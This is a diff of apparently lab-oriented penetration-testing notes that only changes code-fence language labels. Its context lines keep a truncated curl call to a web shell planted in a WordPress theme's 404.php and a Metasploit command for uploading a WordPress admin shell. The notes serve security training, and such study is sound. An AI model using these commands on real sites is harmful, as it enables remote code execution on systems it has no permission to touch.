@@ -149,7 +149,7 @@ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=
 ```
 
 Metasploit `wp_admin_shell_upload` (username-password should be provided)
-```msf
+```shell
 use exploit/unix/webapp/wp_admin_shell_upload 
 ```
 
@@ -887,7 +887,7 @@ disas main
 
 #### DLL
 DLL file is a `Dynamically Linked Library` and it contains code that is called from other programs while they are running.
-```pwsh
+```powershell
 Get-FileMetaData .\MultimasterAPI.dll
 ```
 Using the debugger and .NET assembly editor [dnSpy](https://github.com/0xd4d/dnSpy), we can view the source code directly.
